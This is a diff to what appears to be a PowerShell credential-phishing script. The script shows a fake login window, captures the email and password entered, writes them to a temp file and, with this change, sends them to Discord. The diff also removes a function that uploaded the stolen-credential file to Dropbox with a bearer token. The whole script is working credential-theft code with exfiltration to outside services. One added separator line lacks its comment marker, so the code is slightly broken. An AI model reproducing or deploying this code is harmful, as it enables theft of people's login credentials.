@@ -125,12 +125,15 @@ $loginButton.Add_Click({
     $enteredUsername = $Username.Text
     $enteredPassword = $Password.Password
 
-    # Send the collected data
-    $fileName = "$env:USERNAME-$(Get-Date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+    # Send the collected data to Discord
     $creds = "Email: $enteredUsername`nPassword: $enteredPassword"
+    Upload-Discord -text $creds
+
+    # Save the data to a file
+    $fileName = "$env:USERNAME-$(Get-Date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
     $creds | Out-File -FilePath "$env:TEMP\$fileName" -Encoding utf8
 
-    # Add your code for uploading the file to Dropbox and sending to Discord here
+    # Add your code for uploading the file to Dropbox here
 
     $loginWindow.Close()
     Write-Host "Data sent successfully!"
@@ -138,7 +141,7 @@ $loginButton.Add_Click({
 
 # Show the login window
 $loginWindow.ShowDialog()
-#------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------
 
 <#
 
@@ -147,36 +150,6 @@ $loginWindow.ShowDialog()
 #>
 
 echo $creds >> $env:TMP\$FileName
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to upload your files to dropbox
-#>
-
-function DropBox-Upload {
-
-[CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
